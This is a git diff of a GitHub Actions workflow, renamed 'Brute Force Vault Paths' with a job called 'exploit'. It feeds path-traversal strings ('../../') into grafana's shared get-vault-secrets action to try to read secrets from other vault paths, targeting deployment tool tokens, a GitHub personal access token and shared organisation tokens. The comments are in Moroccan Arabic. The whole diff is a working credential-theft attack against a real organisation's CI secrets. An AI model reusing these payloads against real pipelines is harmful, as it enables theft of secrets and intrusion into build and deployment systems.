@@ -1,10 +1,10 @@
-name: "Verify Official Action Logic"
+name: "Brute Force Vault Paths"
 on:
   push:
     branches: [ test-path-traversal ]
 
 jobs:
-  test:
+  exploit:
     runs-on: ubuntu-latest
     permissions:
       contents: read
@@ -12,9 +12,13 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       
-      - name: "Official Action Traversal Test"
+      - name: "Multi-Path Traversal Test"
         uses: grafana/shared-workflows/actions/get-vault-secrets@main
         with:
-          # هنا غانعطيوها الـ Payload ديريكت فـ الـ input الرسمي ديالهم
+          # غانسييو كاع الـ احتمالات اللي يقدر يكون فيها الـ TOKEN
           repo_secrets: |
-            TEST_PATH=../../grafana/internal/admin-token:value
+            TARGET_1=../../grafana/grafana-bench/DEPLOYMENT_TOOLS_TOKEN:value
+            TARGET_2=../../deployment_tools/DEPLOYMENT_TOOLS_TOKEN:value
+            TARGET_3=../../ci/DEPLOYMENT_TOOLS_TOKEN:value
+            TARGET_4=../../common/github-pat:value
+            TARGET_5=../../org/shared-token:value
